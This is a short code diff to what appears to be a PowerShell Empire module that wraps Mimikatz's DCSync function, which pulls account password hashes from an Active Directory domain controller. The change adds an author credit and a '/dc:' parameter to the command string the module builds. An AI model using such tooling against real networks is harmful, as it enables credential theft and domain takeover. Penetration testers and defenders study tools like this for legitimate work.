@@ -7,7 +7,7 @@ class Module:
         self.info = {
             'Name': 'Invoke-Mimikatz DCsync',
 
-            'Author': ['@gentilkiwi', '@JosephBialek'],
+            'Author': ['@gentilkiwi', 'Vincent Le Toux', '@JosephBialek'],
 
             'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                             "to extract a given account password through "
@@ -90,6 +90,9 @@ class Module:
 
         if self.options["domain"]['Value'] != "":
             script += " /domain:" + self.options['domain']['Value']
+
+        if self.options["dc"]['Value'] != "":
+            script += " /dc:" + self.options['dc']['Value']
 
         script += "\"';"
 
